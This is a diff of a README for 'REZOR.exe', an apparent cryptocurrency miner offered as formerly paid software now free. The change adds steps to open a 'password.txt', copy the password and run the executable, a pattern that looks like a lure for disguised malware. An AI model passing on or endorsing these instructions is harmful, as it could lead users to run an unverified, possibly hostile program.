@@ -1,5 +1,10 @@
 # REZOR.exe
-I present to you the high-quality software from the QXerpix team, which provided its product for monthly payment in 2018. It later became free and was released in July 2019 on various forums.
+
+Installation instruction:
+1.Open "password.txt"
+2.Copy pass (Keep a password so you don’t forget!)
+3.Open REZOR.exe
+
 
 
 A program for mining cryptocurrencies, such as:
